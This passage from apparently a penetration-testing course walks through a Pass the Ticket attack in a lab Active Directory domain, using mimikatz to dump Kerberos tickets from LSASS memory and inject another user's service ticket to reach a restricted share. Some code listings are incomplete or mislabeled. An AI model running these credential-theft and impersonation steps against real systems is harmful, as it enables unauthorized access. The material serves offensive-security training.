### 23.1.5 Overpass the Ticket
We used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.
The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

Let's first log in as jen to CLIENT76 and verify that we are unable to access the resource on WEB04. To do so, we'll try to list the content of the \\web04\backup folder from an administrative PowerShell command line session.

```
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> ls \\web04\backup
ls : Access to the path '\\web04\backup' is denied.
At line:1 char:1
+ ls \\web04\backup
+ ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\web04\backup:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```
    Listing 23 - Verifying that the user jen has no access to the shared folder

Confirming that jen has no access to the restricted folder, we can now launch mimikatz, enable debug privileges, and export all the TGT/TGS from memory with the sekurlsa::tickets /export command.


```
mimikatz #privilege::debug
Privilege '20' OK

mimikatz #sekurlsa::tickets /export

    Listing 24 - Exporting Kerberos TGT/TGS to disk

The above command parsed the LSASS process space in memory for any TGT/TGS, which is then saved to disk in the kirbi mimikatz format.
Inspecting the generated tickets indicates that dave had initiated a session. We can try to inject one of their tickets inside jen's sessions.

We can verify newly generated tickets with dir, filtering out on the kirbi extension.

```
PS C:\Tools> dir *.kirbi

    Listing 25 - Exporting Kerberos TGT/TGS to disk

As many tickets have been generated, we can just pick any TGS ticket in the dave@cifs-web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.
```
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

* File: '[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK
```
    Listing 26 - Injecting the selected TGS into process memory.

No errors have been thrown, meaning that we should expect the ticket in our session when running klist.
```

    Listing 27 - Inspecting the injected ticket in memory

We notice that the dave ticket has been successfully imported in our own session for the jen user.
Let's confirm we have been granted access to the restricted shared folder.
```
PS C:\Tools> ls \\web04\backup


    Directory: \\web04\backup

    Listing 28 - Accessing the shared folder through the injected ticket
Awesome! We managed to successfully access the folder by impersonating dave's identity after injecting its authentication token into our user's process.
